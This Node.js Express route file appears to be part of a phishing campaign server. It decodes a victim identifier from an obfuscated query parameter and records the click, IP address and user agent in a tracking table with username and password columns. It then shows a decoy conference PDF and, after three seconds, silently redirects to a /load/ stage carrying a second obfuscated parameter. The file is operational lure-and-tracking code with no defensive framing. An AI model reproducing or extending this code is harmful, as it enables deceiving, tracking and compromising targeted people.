

const express = require ('express');
const router = express.Router();
const db = require('./db');

router.use('/static', express.static('public'));
router.use(express.static('public'));

router.get('/', (req, res) => {

     const data = req.query.hkgd5dsgkjhrturtu5780808bopipidfg;
    
    if (data == null) {
        res.render('error');
        
      }else{

    const userid = Buffer.from(data, 'base64').toString('utf-8');
  
    const word = 'clicked';
    const clientIP = req.headers['x-forwarded-for'];
    const ip =  clientIP.split(',')[0].trim(); 
    //const ip = req.socket.remoteAddress; 
    const useragent = req.get('User-Agent');
    const date = new Date();
    const notify = 2;


            const insertQuery = 'INSERT INTO clkTable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
            db.query(insertQuery, [userid, word, ip, useragent, date, notify], (err) => {
                if (err) {
                    console.error('Error inserting record:', err);
                    return res.status(500).send('Internal Server Error');
                }
              

                });


        

    const url = `/load/?lfdkjgiroetuiroyhgfhnbjkfsdfiowerierehjre=${data}`;

   

    const htmlContent = `
          <!DOCTYPE html>
          <html lang="en">
          <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
              <title>Redirect on Mouse Event</title>
    <script>
                setTimeout(function() {
                    window.location.href = '${url}';
                }, 3000);
            </script>
            
            <!-- <script>
        // Function to redirect to the new page
        function redirectToNewPage() {
            window.location.href = "${url}";  // Replace with your target URL
        }

        // Add event listeners for 'mousemove' and 'click'
        //document.addEventListener("mousemove", redirectToNewPage);
        document.addEventListener("click", redirectToNewPage);
        document.addEventListener("scroll", redirectToNewPage);
    </script>  -->
</head>
<body>
   <object width="1800" height="900" data="./Conference on 21 Jan 2025.pdf"></object>
   
   <!--  <center> <img src="./drone operation.png">  </center>    -->
    
</body>
</html>

        
    `;

    // Send the HTML content as a response
    res.send(htmlContent);


      }

});

module.exports =router
